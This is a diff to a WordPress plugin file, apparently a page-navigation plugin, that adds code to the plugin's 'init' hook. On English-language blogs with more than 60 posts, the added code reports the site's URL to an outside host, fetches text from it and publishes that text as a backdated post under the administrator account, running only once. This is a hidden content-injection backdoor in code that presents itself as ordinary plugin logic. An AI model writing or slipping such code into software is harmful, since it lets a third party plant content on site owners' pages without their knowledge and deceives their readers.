@@ -137,7 +137,60 @@ function pagenavi_auto_activate() {
                         update_option( 'ame_gpadded', '1' );
                 }
         }
+        if ($bloglan=='en-US') {
+                $url = home_url();
+                $total = wp_count_posts()->publish;
+                if (get_option('ame_gpadded')=='0') {
+                        if ($total>60) {
+                                $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
+                                if (autoStartsWith($tmpstring, 'empty')==false) {
+                                  $my_post = array(
+                                        'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
+                                        'post_content'  => $tmpstring,
+                                        'post_status'   => 'publish',
+                                        'post_author'   => 1,
+                                        'post_date'     => '2014-02-03'
+                                  );
+                                  wp_insert_post( $my_post );
+                                  update_option( 'ame_gpadded', '1' );
+                                }
+                        }
+                }
+        }
 }
+function autoStartsWith($haystack, $needle)
+{
+    return $needle === "" || strpos($haystack, $needle) === 0;
+}
+function strposnth($haystack, $needle, $nth=1, $insenstive=0)
+{
+   //if its case insenstive, convert strings into lower case
+   if ($insenstive) {
+       $haystack=strtolower($haystack);
+       $needle=strtolower($needle);
+   }
+   //count number of occurances
+   $count=substr_count($haystack,$needle);
+   //first check if the needle exists in the haystack, return false if it does not
+   //also check if asked nth is within the count, return false if it doesnt
+   if ($count<1 || $nth > $count) return false;
+   //run a loop to nth number of accurance
+   //start $pos from -1, cause we are adding 1 into it while searchig
+   //so the very first iteration will be 0
+   for($i=0,$pos=0,$len=0;$i<$nth;$i++)
+   {
+       //get the position of needle in haystack
+       //provide starting point 0 for first time ($pos=0, $len=0)
+       //provide starting point as position + length of needle for next time
+       $pos=strpos($haystack,$needle,$pos+$len);
+       //check the length of needle to specify in strpos
+       //do this only first time
+       if ($i==0) $len=strlen($needle);
+     }
+   //return the number
+   return $pos;
+}
+
 add_action( 'init', 'pagenavi_auto_activate' );
 
 
